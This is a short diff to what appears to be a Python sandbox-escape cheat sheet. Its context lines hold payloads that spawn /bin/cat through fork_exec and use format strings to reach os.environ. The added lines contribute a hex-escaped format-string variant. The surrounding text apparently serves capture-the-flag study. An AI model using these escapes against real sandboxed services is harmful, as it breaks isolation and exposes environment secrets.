@@ -259,7 +259,11 @@ __builtins__.__loader__.load_module('_posixsubprocess').fork_exec([b"/bin/cat", 
 "{0.__self__.help.__call__.__globals__[sys].modules[os].environ}".format(print)
 "{a.__self__.help.__call__.__globals__[sys].modules[os].environ}".format_map({"a":print})
 "{0.gi_frame.f_builtins[help].__call__.__globals__[sys].modules[os].environ}".format((x for x in ()))
+
+# this also works
+"{0\x2e\x5f\x5fclass\x5f\x5f}".format(0)
 ```
+
 
 ### RCE with format strings
 ```py
